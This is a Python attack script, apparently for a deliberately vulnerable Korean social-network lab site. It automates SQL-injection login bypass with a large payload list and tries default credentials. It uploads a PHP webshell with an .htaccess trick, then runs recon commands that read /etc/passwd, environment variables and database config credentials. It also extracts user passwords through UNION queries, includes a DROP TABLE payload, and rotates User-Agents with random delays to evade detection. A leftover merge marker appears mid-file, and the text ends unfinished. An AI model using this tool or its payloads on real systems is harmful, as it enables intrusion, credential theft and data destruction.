import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
from urllib.parse import quote
import time
import json
import re
import random
import base64
import os
from datetime import datetime

class VulnerableSNSAttacker:
    def __init__(self, base_url, attacker_server):
        self.base_url = base_url.rstrip('/')
        self.attacker_server = attacker_server.rstrip('/')
        self.session = requests.Session()

        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        # Legitimate User-Agents pool for rotation (evade detection)
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]

        self._rotate_user_agent()

        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1'
        })
        self.vulnerabilities = {
            'sql_injection': [],
            'xss': [],
            'csrf': [],
            'lfi': [],
            'file_upload': []
        }
        self.logged_in = False
        self.current_points = 0
        self.attacker_user_id = None
        self.uploaded_webshell = None
        self.start_time = datetime.now()
        self.attack_timeline = []
    
    def log_event(self, event_type, description, severity="INFO", details=None):
        """공격 타임라인 로깅"""
        event = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'type': event_type,
            'description': description,
            'severity': severity,
            'details': details or {}
        }
        self.attack_timeline.append(event)
    
    def print_section(self, title):
        print("\n" + "="*60)
        print(f"{title}")
        print("="*60)

    def _rotate_user_agent(self):
        """Rotate User-Agent to evade detection"""
        ua = random.choice(self.user_agents)
        self.session.headers.update({'User-Agent': ua})

    def _random_delay(self, min_sec=0.5, max_sec=2.5):
        """Add random delay to evade rate-based detection"""
        delay = random.uniform(min_sec, max_sec)
        time.sleep(delay)

    def _add_legitimate_headers(self, url):
        """Add legitimate browser headers including Referer"""
        headers = {}
        # Add Referer to look like normal browsing
        if 'login.php' not in url:
            headers['Referer'] = f"{self.base_url}/index.php"
        return headers

    def _obfuscate_payload(self, payload):
        """Simple payload obfuscation techniques"""
        obfuscated = []

        # Original
        obfuscated.append(payload)

        # URL encoding
        obfuscated.append(quote(payload))

        # Unicode normalization (Korean compatible)
        # Mix of different character representations
        obfuscated.append(payload.replace('http', 'hxxp').replace(':', '[:]'))

        return obfuscated
    
    def _try_login(self, username, password, description):
        """Helper method to attempt login with given credentials"""
        login_url = f"{self.base_url}/login.php"

        try:
            # Evade detection: rotate UA and add delay
            self._rotate_user_agent()
            self._random_delay(1.0, 3.0)  # Longer delay for login attempts

            print(f"\n[*] Trying: {description}")
            print(f"    Username: {username}")
            print(f"    Password: {password}")

            data = {'username': username, 'password': password}
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.base_url,
                'Referer': f"{self.base_url}/login.php"
            }
            response = self.session.post(login_url, data=data, headers=headers, allow_redirects=True, timeout=30)

            print(f"    Status Code: {response.status_code}")
            print(f"    Final URL: {response.url}")
            print(f"    Cookies: {dict(self.session.cookies)}")

            # Check multiple success indicators
            success = False
            success_reasons = []

            # IMPORTANT: If still on login.php, it's NOT a success
            if 'login.php' in response.url:
                print(f"[-] Failed - Still on login page")
                # Check for error messages
                if 'error' in response.text.lower() or 'invalid' in response.text.lower() or '실패' in response.text:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    error_div = soup.find('div', class_='error')
                    if error_div:
                        print(f"    Server message: {error_div.get_text(strip=True)[:100]}")
            else:
                if 'index.php' in response.url or response.url.endswith('/www/') or response.url.endswith('/www') or response.url.endswith('/'):
                    success = True
                    success_reasons.append("URL redirect to index")

                # Only check session cookie if we also redirected away from login
                if success and ('PHPSESSID' in self.session.cookies or 'session' in str(self.session.cookies).lower()):
                    success_reasons.append("Session cookie set")

                # Check for logout button or welcome message
                if 'logout' in response.text.lower() or 'welcome' in response.text.lower() or '로그아웃' in response.text:
                    if not success:
                        success = True
                    success_reasons.append("Logout/Welcome found in page")

            if success:
                print(f"[+] SUCCESS! Logged in ({', '.join(success_reasons)})")
                print(f"    Final URL: {response.url}")

                soup = BeautifulSoup(response.text, 'html.parser')
                points_text = soup.find(text=re.compile(r'\d+\s*P'))
                if points_text:
                    points_match = re.search(r'(\d+)\s*P', points_text)
                    if points_match:
                        self.current_points = int(points_match.group(1))
                        print(f"    Current Points: {self.current_points}P")

                self.logged_in = True
                self.get_attacker_user_id()

                return True

        except requests.exceptions.Timeout:
            print(f"[-] Timeout - Server took too long to respond")
        except requests.exceptions.ConnectionError as e:
            print(f"[-] Connection Error: {str(e)[:100]}")
        except Exception as e:
            print(f"[-] Error ({type(e).__name__}): {str(e)[:100]}")

        return False

    def get_attacker_user_id(self):
        """공격자의 user_id 확인"""
        try:
            response = self.session.get(f"{self.base_url}/profile.php")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            user_id_input = soup.find('input', {'name': 'user_id'})
            if user_id_input:
                self.attacker_user_id = user_id_input.get('value')
                print(f"[*] Attacker User ID: {self.attacker_user_id}")
                return self.attacker_user_id
            
            profile_link = soup.find('a', href=re.compile(r'profile\.php\?user='))
            if profile_link:
                match = re.search(r'user=(\d+)', profile_link['href'])
                if match:
                    self.attacker_user_id = match.group(1)
                    print(f"[*] Attacker User ID: {self.attacker_user_id}")
                    return self.attacker_user_id
            
            if 'user_id' in self.session.cookies:
                self.attacker_user_id = self.session.cookies['user_id']
                print(f"[*] Attacker User ID from cookie: {self.attacker_user_id}")
                return self.attacker_user_id
            
            response = self.session.get(f"{self.base_url}/index.php")
            match = re.search(r'user_id\s*=\s*(\d+)', response.text)
            if match:
                self.attacker_user_id = match.group(1)
                print(f"[*] Attacker User ID from page: {self.attacker_user_id}")
                return self.attacker_user_id
                    
        except Exception as e:
            print(f"[-] Error getting user ID: {e}")
        
        self.attacker_user_id = "1"
        print(f"[*] Using default User ID: {self.attacker_user_id}")
        return self.attacker_user_id
    
    def test_sql_injection_login(self):
        """SQL Injection - password 필드 공격 + 기본 자격증명 확인"""
        self.print_section("Authentication Testing - SQL Injection & Default Credentials")

        login_url = f"{self.base_url}/login.php"

        # Try SQL Injection FIRST (higher severity vulnerability)
        print("[*] Testing SQL Injection payloads first...")

        payloads = [
            # Classic SQLi payloads
            ("admin", "' or '1'='1' --", 'Single quote OR bypass with comment'),
            ("admin", "' or '1'='1", 'Single quote OR bypass without comment'),
            ("admin", '" or "1"="1" --', 'Double quote OR bypass'),
            ("admin", '" or 1=1 --', 'Double quote numeric OR'),

            # Username field injection
            ('admin" or "a"="a" --', 'anything', 'Username field injection'),
            ('admin" --', 'anything', 'Comment out password'),
            ("admin' --", 'anything', 'Single quote comment out password'),
            ("admin' OR '1'='1' --", 'password', 'Username field single quote injection'),
            ("admin'or'1'='1'--", 'password', 'Username field no space injection'),

            # Comment variations
            ("admin", "' OR 1=1--", 'Single quote no space comment'),
            ("admin", "' OR '1'='1' #", 'Single quote with hash comment'),
            ("admin", "' OR 1=1#", 'Single quote numeric with hash'),
            ("admin", "' OR 1=1/*", 'SQL comment with /*'),
            ("admin", "' OR '1'='1'/*", 'Single quote with /* comment'),
            ("admin", "' OR 1=1;--", 'Semicolon with comment'),

            # Space bypass techniques
            ("admin", "'or'1'='1'--", 'No spaces single quote'),
            ("admin", "'/**/or/**/1=1--", 'Comment-based space bypass'),
            ("admin", "'\tor\t1=1--", 'Tab-based space bypass'),
            ("admin", "'\nor\n1=1--", 'Newline-based space bypass'),
            ("admin", "'+or+'1'='1'--", 'Plus sign space bypass'),
            ("admin", "'%09or%091=1--", 'URL encoded tab bypass'),
            ("admin", "'%0aor%0a1=1--", 'URL encoded newline bypass'),

            # Case variation bypass
            ("admin", "' Or '1'='1' --", 'Mixed case Or'),
            ("admin", "' oR 1=1 --", 'Mixed case oR'),
            ("admin", "' OR 1=1 --", 'Uppercase OR'),
            ("admin", "' Or 1=1--", 'Mixed case no space'),

            # Logical operator variations
            ("admin", "' || '1'='1' --", 'Double pipe OR'),
            ("admin", "' && 1=1 --", 'Double ampersand AND'),
            ("admin", "' | 1 --", 'Single pipe'),
            ("admin", "' & 1 --", 'Single ampersand'),

            # Comparison operator variations
            ("admin", "' or 1=1 limit 1--", 'Limit 1 bypass'),
            ("admin", "' or 'a'='a' --", 'String comparison bypass'),
            ("admin", "' or ''=' --", 'Empty string comparison'),
            ("admin", "' or 1 --", 'Simple 1 bypass'),
            ("admin", "' or true --", 'Boolean true bypass'),

            # Union-based attempts
            ("admin", "' UNION SELECT 1,1,1--", 'Union select 3 columns'),
            ("admin", "' UNION SELECT NULL,NULL,NULL--", 'Union select NULL'),
            ("admin", "' UNION ALL SELECT 1,1,1--", 'Union ALL select'),

            # Time-based blind SQLi
            ("admin", "' or sleep(5)--", 'Sleep-based blind SQLi'),
            ("admin", "' or benchmark(10000000,md5('a'))--", 'Benchmark blind SQLi'),

            # Stacked queries
            ("admin", "'; DROP TABLE users--", 'Stacked query attempt'),
            ("admin", "'; SELECT 1--", 'Stacked SELECT query'),

            # Encoding bypass
            ("admin", "%27%20or%20%271%27%3d%271%27--", 'URL encoded payload'),
            ("admin", "&#39; or &#39;1&#39;=&#39;1&#39;--", 'HTML entity encoded'),

            # Special character bypass
            ("admin", "' or 1=1%00", 'Null byte bypass'),
            ("admin", "' or 1=1\x00", 'Hex null byte'),
            ("admin", "' or 1=1\n--", 'Literal newline'),

            # Parenthesis bypass
            ("admin", "') or ('1'='1' --", 'Parenthesis closure'),
            ("admin", "')) or (('1'='1' --", 'Double parenthesis closure'),
            ("admin", "') or '1'='1'--", 'Single closing paren'),

            # Alternative syntax
            ("admin", "admin' or 1=1#", 'Hash comment MySQL'),
            ("admin", "admin' or 1=1/*", 'Block comment start'),
            ("admin", "admin' or 1=1;%00", 'Semicolon null byte'),

            # Concatenation bypass
            ("admin", "' or CONCAT('a','a')='aa'--", 'CONCAT function'),
            ("admin", "' or ASCII('a')=97--", 'ASCII function'),
            ("admin", "' or CHAR(97)='a'--", 'CHAR function'),

            # Hex encoding
            ("admin", "0x61646d696e' or 1=1--", 'Hex encoded admin'),
            ("admin", "' or 0x31=0x31--", 'Hex comparison'),

            # Multiple conditions
            ("admin", "' or 1=1 and '1'='1'--", 'OR and AND combination'),
            ("admin", "' or (1=1 and 2=2)--", 'Grouped conditions'),

            # PostgreSQL specific
            ("admin", "' or 1=1--", 'PostgreSQL comment'),
            ("admin", "' or 'x'='x' --", 'PostgreSQL string compare'),

            # MySQL specific
            ("admin", "' or 1=1#", 'MySQL hash comment'),
            ("admin", "' /*!50000or*/ 1=1--", 'MySQL conditional comment'),

            # MSSQL specific
            ("admin", "' or 1=1;--", 'MSSQL semicolon'),
            ("admin", "' or 1=1/**/--", 'MSSQL comment spacing'),

            # Advanced evasion
            ("admin", "'||'1'='1'--", 'Concatenation OR'),
            ("admin", "' or '1'LIKE'1'--", 'LIKE operator'),
            ("admin", "' or '1' IN ('1')--", 'IN operator'),
            ("admin", "' or '1' BETWEEN '0' AND '2'--", 'BETWEEN operator'),

            # Backtick variations
            ("admin", "` or `1`=`1`--", 'Backtick usage'),

            # More aggressive payloads
            ("admin", "admin'--", 'Simple comment out'),
            ("admin", "admin'#", 'Hash comment out'),
            ("admin", "admin'/*", 'Block comment out'),
            ('admin" or "a"="a" --', 'anything', 'Username field injection'),
            ('admin" --', 'anything', 'Comment out password'),
            ("admin' --", 'anything', 'Single quote comment out password'),
            ("admin", "' OR 1=1--", 'Single quote no space comment'),
            ("admin", "' OR '1'='1' #", 'Single quote with hash comment'),
            ("admin", "' OR 1=1#", 'Single quote numeric with hash'),
            ("admin' OR '1'='1' --", 'password', 'Username field single quote injection'),
        ]
        
        for username, password, desc in payloads:
            if self._try_login(username, password, desc):
                # Log as SQL injection vulnerability
                vuln_info = {
                    'url': login_url,
                    'username': username,
                    'password': password,
                    'description': desc,
                    'impact': 'CRITICAL - Authentication bypass, full account takeover',
                    'cvss_score': 9.8
                }
                self.vulnerabilities['sql_injection'].append(vuln_info)

                self.log_event(
                    'SQL_INJECTION',
                    'Successfully bypassed authentication using SQL injection',
                    'CRITICAL',
                    {
                        'payload': f"username={username}, password={password}",
                        'method': desc,
                        'account': username,
                        'points': self.current_points
                    }
                )
                return True

        # SQL Injection failed, try default credentials as fallback
        print("\n[*] SQL Injection failed. Trying default credentials as fallback...")
        default_creds = [
            ("admin", "admin123"),
            ("alice", "alice2024"),
            ("bob", "bobby123"),
        ]

        for username, password in default_creds:
            if self._try_login(username, password, f"Default credentials: {username}/{password}"):
                # Log as weak credentials vulnerability
                vuln_info = {
                    'url': login_url,
                    'username': username,
                    'password': password,
                    'description': 'Default credentials still active',
                    'impact': 'HIGH - Unauthorized access with default credentials',
                    'cvss_score': 7.5
                }
                self.vulnerabilities['sql_injection'].append(vuln_info)

                self.log_event(
                    'WEAK_CREDENTIALS',
                    f'Logged in with default credentials: {username}/{password}',
                    'HIGH',
                    {'username': username, 'password': password, 'points': self.current_points}
                )
                return True

        return False
    
    def test_file_upload_rce(self):
        """File Upload - 웹쉘 업로드"""
        self.print_section("File Upload - Webshell Upload")

        if not self.logged_in:
            print("[-] Login required")
            return False

        upload_url = f"{self.base_url}/upload.php"
        file_url = f"{self.base_url}/file.php"

        # Enhanced webshell with multiple execution methods
        webshell_code = b'''<?php
if(isset($_GET["cmd"])) {
    echo "<pre>";
    $cmd = $_GET["cmd"];
    if(function_exists('system')) {
        system($cmd);
    } elseif(function_exists('exec')) {
        echo exec($cmd);
    } elseif(function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif(function_exists('passthru')) {
        passthru($cmd);
    } else {
        echo "No execution function available";
    }
    echo "</pre>";
}
?>'''

        test_files = [
            ('shell.jpg', 'JPG with .htaccess'),  # Try after .htaccess
            ('shell.txt', 'TXT with .htaccess'),  # Try after .htaccess
            ('shell.php', 'Direct PHP (may be blocked)'),
            ('shell.php3', 'PHP3 extension'),
            ('shell.php5', 'PHP5 extension'),
            ('shell.phtml', 'PHTML extension'),
            ('shell.php.jpg', 'Double extension PHP.JPG'),
            ('shell.jpg.php', 'Double extension JPG.PHP'),
            ('shell.php%00.jpg', 'Null byte injection'),
            ('shell.PhP', 'Case variation PHP'),
            ('shell.pHp', 'Case variation pHp'),
        ]

        print("[*] Uploading webshell (bypassing .php filter)...")

        # First, try to upload .htaccess to make all files executable
        print("\n[*] Attempting .htaccess upload to enable PHP execution...")
        htaccess_content = b'''AddType application/x-httpd-php .jpg .png .gif .txt
<FilesMatch ".(jpg|png|gif|txt)$">
    SetHandler application/x-httpd-php
</FilesMatch>'''

        try:
            files = {'file': ('.htaccess', htaccess_content, 'text/plain')}
            htaccess_resp = self.session.post(upload_url, files=files, allow_redirects=True)
            if htaccess_resp.status_code == 200:
                print(f"[+] .htaccess upload attempted (status: {htaccess_resp.status_code})")
            else:
                print(f"[-] .htaccess upload failed (status: {htaccess_resp.status_code})")
        except Exception as e:
            print(f"[-] .htaccess upload error: {str(e)[:50]}")

        for filename, desc in test_files:
            try:
                # Evade detection
                self._rotate_user_agent()
                self._random_delay(1.5, 3.0)

                print(f"\n[*] Trying: {filename} ({desc})")

                files = {'file': (filename, webshell_code, 'application/x-php')}
                response = self.session.post(upload_url, files=files, allow_redirects=True)

                print(f"    Upload response status: {response.status_code}")

                # Try multiple access methods
                test_cmd = 'whoami'
                access_methods = [
                    (f"{file_url}?name={filename}&cmd={test_cmd}", 'Via file.php LFI'),
                    (f"{self.base_url}/uploads/{filename}?cmd={test_cmd}", 'Direct uploads access'),
                ]

                for access_url, method in access_methods:
                    try:
                        self._random_delay(1.0, 2.0)
                        print(f"\n[*] Testing {method}: {access_url}")

                        cmd_response = self.session.get(access_url, timeout=30)

                        # Check for execution in two ways: LFI content div OR direct output
                        soup = BeautifulSoup(cmd_response.text, 'html.parser')
                        content_div = soup.find('div', class_='file-content')

                        # Look for command execution results section
                        exec_result_div = soup.find('div', class_='exec-result')
                        if not exec_result_div:
                            # Try to find by text pattern
                            for div in soup.find_all('div'):
                                if '명령어 실행 결과' in div.get_text():
                                    exec_result_div = div
                                    break

                        output = None
                        if exec_result_div:
                            # Extract only execution result
                            output = exec_result_div.get_text(strip=True)
                            # Remove the header if present
                            if '명령어 실행 결과' in output:
                                output = output.split('명령어 실행 결과')[-1].strip()
                        elif content_div:
                            full_output = content_div.get_text(strip=True)
                            # Try to extract command result from mixed output
                            # Look for patterns after PHP code
                            lines = full_output.split('\n')
                            result_lines = []
                            in_result = False
                            for line in lines:
                                if '?>' in line:  # End of PHP code
                                    in_result = True
                                    continue
                                if in_result and line.strip() and '<?php' not in line:
                                    result_lines.append(line)

                            if result_lines:
                                output = '\n'.join(result_lines)
                            else:
                                output = full_output
                        else:
                            # Direct access - check whole response
                            output = cmd_response.text

                        # Check if command executed - look for typical command output patterns
                        if output:
                            # Remove PHP code parts for checking
                            clean_output = output.replace('<?php', '').replace('?>', '')

                            # Check for command execution indicators
                            success_indicators = ['www-data', 'apache', 'root', 'nginx', '/var/www', '/home',
                                                'uid=', 'gid=', 'total', 'drwx', '.php', 'bin/', 'usr/']

                            if any(indicator in clean_output.lower() for indicator in success_indicators):
                                print(f"[+] SUCCESS! Webshell is working via {method}")
                                print(f"    Test command: {test_cmd}")
                                print(f"    Output: {clean_output[:150]}")

                                # Save the webshell filename and access method
                                self.uploaded_webshell = filename

                                vuln_info = {
                                    'upload_url': upload_url,
                                    'filename': filename,
                                    'command': test_cmd,
                                    'output': output[:200],
                                    'access_url': access_url.replace(test_cmd, '{COMMAND}'),
                                    'access_method': method,
                                    'impact': 'CRITICAL - Remote Code Execution achieved',
                                    'cvss_score': 10.0
                                }
                                self.vulnerabilities['file_upload'].append(vuln_info)

                                self.log_event(
                                    'FILE_UPLOAD_RCE',
                                    f'Successfully uploaded webshell: {filename}',
                                    'CRITICAL',
                                    {
                                        'filename': filename,
                                        'bypass_method': desc,
                                        'access_method': method,
                                        'test_command': test_cmd,
                                        'output': output[:100]
                                    }
                                )

                                print(f"[+] Webshell ready for exploitation!")
                                print(f"    Access URL: {access_url.replace(test_cmd, '<COMMAND>')}")
                                return True
                            else:
                                print(f"[-] Got output but doesn't look like command execution")
                                print(f"    Output preview: {output[:100]}")
                        else:
                            print(f"[-] PHP source code returned (not executing)")

                    except Exception as e:
                        print(f"[-] Error testing {method}: {str(e)[:100]}")

            except Exception as e:
                print(f"[-] Upload error: {str(e)[:100]}")

        return False
    
    def test_lfi(self):
        """LFI - Local File Inclusion + RCE via Webshell"""
        self.print_section("LFI/RCE - Remote Command Execution via Webshell")

        if not self.logged_in:
            print("[-] Login required")
            return False

        file_url = f"{self.base_url}/file.php"
        success_count = 0

        # Focus on webshell RCE if available
        if self.uploaded_webshell:
            print(f"\n[*] Testing RCE via webshell: {self.uploaded_webshell}")
            print("[*] Running reconnaissance commands for privilege escalation...")

            # Comprehensive recon commands
            recon_commands = [
                ("whoami", "Current user", "www-data|apache|nginx|root"),
                ("id", "User ID and groups", "uid=|gid="),
                ("pwd", "Current directory", "/var/www|/home"),
                ("ls -la", "Directory listing", "total|drwx"),
                ("cat /etc/passwd", "User accounts", "root:"),
                ("cat /etc/group", "Group information", "root:"),
                ("uname -a", "System information", "Linux|GNU"),
                ("cat /etc/os-release", "OS version", "NAME=|VERSION="),
                ("env", "Environment variables", "PATH=|HOME="),
                ("ps aux", "Running processes", "USER|PID"),
                ("netstat -tulnp 2>/dev/null || ss -tulnp", "Network connections", "LISTEN|tcp"),
                ("find / -perm -4000 -type f 2>/dev/null", "SUID binaries (privilege escalation)", "/usr/bin|/bin"),
                ("sudo -l 2>/dev/null", "Sudo privileges", "sudo|NOPASSWD"),
                ("cat /proc/version", "Kernel version", "Linux version"),
                ("cat /etc/crontab", "Scheduled tasks", "root|cron"),
                ("ls -la /home", "User home directories", "drwx"),
                ("cat /var/www/html/config.php 2>/dev/null || cat /var/www/config.php 2>/dev/null", "Database credentials", "password|DB_PASS"),
                ("cat ../config.php", "Application config", "password|DB"),
                ("ls -la /var/www/html/uploads", "Uploads directory", "shell|php"),
            ]

            rce_results = []

            for cmd, desc, _ in recon_commands:  # indicator not used in new parsing logic
                try:
                    self._rotate_user_agent()
                    self._random_delay(1.5, 3.0)

                    print(f"\n[*] Executing: {desc}")
                    print(f"    Command: {cmd}")

                    params = {'name': self.uploaded_webshell, 'cmd': cmd}
                    response = self.session.get(file_url, params=params, timeout=30)

                    soup = BeautifulSoup(response.text, 'html.parser')

                    # Look for command execution results section first
                    exec_result_div = soup.find('div', class_='exec-result')
                    if not exec_result_div:
                        # Try to find by text pattern
                        for div in soup.find_all('div'):
                            if '명령어 실행 결과' in div.get_text():
                                exec_result_div = div
                                break

                    output = None
                    if exec_result_div:
                        # Extract only execution result
                        output = exec_result_div.get_text(strip=True)
                        # Remove the header if present
                        if '명령어 실행 결과' in output:
                            output = output.split('명령어 실행 결과')[-1].strip()
                    else:
                        # Fallback to file-content div
                        content = soup.find('div', class_='file-content')
                        if content:
                            full_output = content.get_text(strip=True)
                            # Try to extract command result from mixed output
                            lines = full_output.split('\n')
                            result_lines = []
                            in_result = False
                            for line in lines:
                                if '?>' in line:  # End of PHP code
                                    in_result = True
                                    continue
                                if in_result and line.strip() and '<?php' not in line:
                                    result_lines.append(line)

                            if result_lines:
                                output = '\n'.join(result_lines).strip()
                            else:
                                # If can't extract, use full output but clean it
                                output = full_output.replace('<?php', '').replace('?>', '').strip()

                    if output is not None:
                        # Remove <pre> tags if present
                        output = output.replace('<pre>', '').replace('</pre>', '')

                        # Accept output (even if short)
                        print(f"[+] SUCCESS! Command executed")
                        if len(output) > 0:
                            print(f"    Output ({len(output)} chars): {output[:400]}")
                        else:
                            print(f"    (No output - command may have executed silently)")

                        rce_results.append({
                            'command': cmd,
                            'description': desc,
                            'output': output[:1000] if output else '(no output)'
                        })

                        success_count += 1

                        # Log interesting findings
                        if output:
                            if 'root' in output.lower() and 'sudo' in cmd:
                                print(f"[!] CRITICAL: Potential sudo privileges found!")
                                print(f"    Sudo output: {output[:200]}")
                            elif 'SUID' in desc or 'suid' in desc.lower() or '-perm' in cmd:
                                if len(output) > 10:
                                    print(f"[!] HIGH: SUID binaries found (privilege escalation vector)")
                                    print(f"    SUID binaries preview: {output[:300]}")
                            elif 'password' in output.lower() or 'db_pass' in output.lower() or 'define' in output:
                                print(f"[!] CRITICAL: Potential credentials found!")
                                print(f"    Credentials preview: {output[:300]}")
                            elif 'config.php' in cmd and 'DB' in output:
                                print(f"[!] CRITICAL: Database configuration found!")
                                print(f"    Config preview: {output[:300]}")
                    else:
                        print(f"[-] No output found")

                except Exception as e:
                    print(f"[-] Error: {str(e)[:100]}")

            # Log RCE capability
            if rce_results:
                vuln_info = {
                    'url': file_url,
                    'webshell': self.uploaded_webshell,
                    'description': f'Remote Code Execution via webshell - {len(rce_results)} commands executed',
                    'commands': rce_results,
                    'impact': 'CRITICAL - Full system access, privilege escalation possible',
                    'cvss_score': 10.0
                }
                self.vulnerabilities['lfi'].append(vuln_info)

                self.log_event(
                    'RCE',
                    f'Remote Code Execution achieved via {self.uploaded_webshell}',
                    'CRITICAL',
                    {
                        'webshell': self.uploaded_webshell,
                        'commands_executed': len(rce_results),
                        'recon_complete': True
                    }
                )

                print(f"\n" + "="*60)
                print(f"[+] RCE Summary:")
                print(f"    Webshell: {self.uploaded_webshell}")
                print(f"    Commands executed: {len(rce_results)}")
                print(f"    Access URL: {file_url}?name={self.uploaded_webshell}&cmd={{COMMAND}}")
                print("="*60)
            else:
                print(f"\n[-] No commands executed successfully")
        else:
            print(f"[-] No webshell available for RCE testing")
            print(f"[*] Webshell upload must succeed first")

        print(f"\n[*] LFI/RCE Results: {success_count} successful operations")
        return success_count > 0
<<<<<<< HEAD

    def test_sql_injection_advanced(self):
        """Advanced SQL Injection tests on various endpoints after login"""
        self.print_section("Advanced SQL Injection - Post-Authentication")

        if not self.logged_in:
            print("[-] Login required for advanced SQLi testing")
            return False

        vuln_found = False

        # Test 1: Search functionality
        print("\n" + "="*60)
        print("[*] Phase 1: Testing Search Functionality")
        print("="*60)
        vuln_found |= self.test_sqli_search()

        # Test 2: Profile/User lookup
        print("\n" + "="*60)
        print("[*] Phase 2: Testing Profile/User Lookup")
        print("="*60)
        vuln_found |= self.test_sqli_profile()

        # Test 3: Post filtering/viewing
        print("\n" + "="*60)
        print("[*] Phase 3: Testing Post Viewing")
        print("="*60)
        vuln_found |= self.test_sqli_posts()

        # Test 4: Second-Order SQL Injection
        print("\n" + "="*60)
        print("[*] Phase 4: Testing Second-Order SQLi")
        print("="*60)
        vuln_found |= self.test_sqli_second_order()

        # Test 5: UNION-based Data Extraction
        print("\n" + "="*60)
        print("[*] Phase 5: UNION-based Data Extraction")
        print("="*60)
        vuln_found |= self.test_sqli_data_extraction()

        # Test 6: Destructive SQL Injection
        print("\n" + "="*60)
        print("[*] Phase 6: Destructive SQL Injection")
        print("="*60)
        vuln_found |= self.test_sqli_destructive()

        if vuln_found:
            print("\n" + "="*60)
            print("[+] ADVANCED SQLi SUMMARY: Vulnerabilities found!")
            print("="*60)
        else:
            print("\n" + "="*60)
            print("[-] No advanced SQL Injection vulnerabilities found")
            print("="*60)

        return vuln_found

    def test_sqli_search(self):
        """Test SQL Injection in search functionality"""
        print("\n[*] Testing SQL Injection in Search...")

        search_endpoints = [
            f"{self.base_url}/search.php",
            f"{self.base_url}/index.php",
            f"{self.base_url}/posts.php",
        ]

        # SQLi payloads optimized for search
        search_payloads = [
            ("' OR 1=1--", "Basic OR bypass"),
            ("' UNION SELECT NULL,NULL,NULL--", "Union 3 cols"),
            ("' UNION SELECT NULL,NULL,NULL,NULL--", "Union 4 cols"),
            ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "Union 5 cols"),
            ("' UNION SELECT 1,2,3--", "Union with numbers 3"),
            ("' UNION SELECT 1,2,3,4--", "Union with numbers 4"),
            ("' UNION SELECT 1,2,3,4,5--", "Union with numbers 5"),
            ("' UNION SELECT username,password,NULL FROM users--", "Extract users 3 cols"),
            ("' UNION SELECT NULL,username,password,NULL FROM users--", "Extract users 4 cols"),
            ("' UNION SELECT NULL,username,password,email,NULL FROM users--", "Extract users 5 cols"),
            ("' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", "Table enumeration"),
            ("' UNION SELECT column_name,table_name,NULL FROM information_schema.columns--", "Column enumeration"),
            ("' AND 1=2 UNION SELECT database(),user(),version()--", "DB info"),
            ("' OR 'x'='x", "Simple OR"),
            ("admin' ORDER BY 1--", "ORDER BY column count 1"),
            ("admin' ORDER BY 2--", "ORDER BY column count 2"),
            ("admin' ORDER BY 3--", "ORDER BY column count 3"),
            ("admin' ORDER BY 4--", "ORDER BY column count 4"),
            ("admin' ORDER BY 5--", "ORDER BY column count 5"),
        ]

        param_names = ['q', 'search', 'query', 'keyword', 's', 'term']

        for endpoint in search_endpoints:
            for param in param_names:
                for payload, desc in search_payloads:
                    try:
                        self._rotate_user_agent()
                        self._random_delay(0.5, 1.5)

                        params = {param: payload}
                        response = self.session.get(endpoint, params=params, timeout=15)

                        # Check for SQL errors
                        sql_errors = [
                            'sql syntax', 'mysql', 'mysqli', 'postgresql',
                            'warning:', 'error in your sql', 'pg_query',
                            'sqlite', 'odbc', 'oracle', 'mssql',
                            'unknown column', 'table', 'syntax error'
                        ]

                        error_found = any(err in response.text.lower() for err in sql_errors)

                        if error_found:
                            print(f"\n[+] POTENTIAL SQLi FOUND!")
                            print(f"    Endpoint: {endpoint}")
                            print(f"    Parameter: {param}")
                            print(f"    Payload: {payload}")
                            print(f"    Description: {desc}")

                            # Extract error message
                            soup = BeautifulSoup(response.text, 'html.parser')
                            error_text = response.text[:500]
                            for err in sql_errors:
                                if err in response.text.lower():
                                    idx = response.text.lower().find(err)
                                    error_text = response.text[max(0, idx-50):idx+200]
                                    break

                            print(f"    Error preview: {error_text[:300]}")

                            vuln_info = {
                                'url': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'description': f'SQL Injection in search: {desc}',
                                'error': error_text[:500],
                                'impact': 'CRITICAL - Database access, data extraction possible',
                                'cvss_score': 9.8
                            }
                            self.vulnerabilities['sql_injection'].append(vuln_info)

                            self.log_event(
                                'SQL_INJECTION_SEARCH',
                                f'SQL Injection found in {endpoint}?{param}=...',
                                'CRITICAL',
                                {'endpoint': endpoint, 'parameter': param, 'payload': payload}
                            )

                            return True

                        # Check for successful UNION injection (data in response)
                        if 'union' in payload.lower():
                            if re.search(r'root|admin|user|password|database|mysql', response.text, re.I):
                                print(f"\n[+] POSSIBLE UNION SQLi SUCCESS!")
                                print(f"    Endpoint: {endpoint}?{param}={payload}")
                                print(f"    Response contains DB keywords")

                    except Exception as e:
                        continue

        print("[-] No SQL Injection found in search functionality")
